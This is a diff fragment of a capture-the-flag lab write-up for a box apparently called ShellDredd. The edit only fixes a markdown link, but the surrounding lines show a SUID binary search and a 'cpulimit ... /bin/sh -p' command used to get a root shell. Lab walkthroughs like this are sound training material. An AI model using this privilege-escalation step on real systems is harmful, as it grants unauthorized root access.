@@ -187,7 +187,7 @@ hannah@ShellDredd:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -
 -rwxr-sr-x 1 root mail 18944 Dec  3  2017 /usr/bin/dotlockfile
 ```
 
-Checking the results reveals that `mawk` and `cpulimit` may be used for privilege escalation. We will use `cpulimit`. Checking ![gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/#suid) shows us how to get `root` access.
+Checking the results reveals that `mawk` and `cpulimit` may be used for privilege escalation. We will use `cpulimit`. Checking [gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/#suid) shows us how to get `root` access.
 
 ```
 hannah@ShellDredd:~$ cpulimit -l 100 -f -- /bin/sh -p
